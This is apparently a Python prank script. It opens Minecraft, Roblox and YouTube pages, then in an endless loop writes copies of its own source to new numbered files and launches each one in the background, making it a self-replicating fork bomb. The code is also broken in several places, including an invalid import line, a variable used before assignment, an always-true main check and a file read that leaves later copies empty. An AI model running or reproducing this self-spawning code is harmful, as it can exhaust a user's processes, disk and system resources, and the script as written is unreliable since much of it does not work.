import webbrowser as wb
import path, system from os
import time

wbarray = [
    'https://www.youtube.com/watch?v=H3_zxK4zb8M',
    'https://www.youtube.com/watch?v=r9aVszSJCnc',
    'https://www.youtube.com/watch?v=Y9wXfdjDzrA'
]


config = {
    'char_limit': 250,
    'har': 'har'
}

def open_links():
    wb.open_new('https://www.minecraft.net/download')
    for link in wbarray:
       wb.open_new_tab(link)

def fork(filename, ):
    num = ''.join(char for char in filename[::-1] if char in '1234567890')

    num1 = str(int(num) * 2) if len(num) else num
    num2 = str(int(num) * 2 + 1) if len(num) else num

    fnames = [
        'har' + (num1 if num1 else '1'),
        'har' + (num2 if num2 else '2')
    ]
    return fnames

def everything():
    print("Hello, Dave.")
    open_links()
    
    filename, ext = path.splitext(path.basename(__file__))
    directory = path.dirname(path.abspath(__file__))
    
    children = fork(filename)

    overflow = sum(len(child) > config['char_limit'] for child in children)

    if overflow:
        print('resetting')
        fnames = [f'{config['har']}{i}' for i in len(fnames)]

    fin = path.join(directory, filename+ext)
    with open(fin) as reader:
        for child in children:
            fout = path.join(directory, child+ext)
            with open(fout, 'w+') as writer:
                writer.write(reader.read())
            system(f'python {fout} &')

if __name__ == __name__:
	wb.open_new('https://www.roblox.com/')
	while 1:
		time.sleep(.2)
		everything()
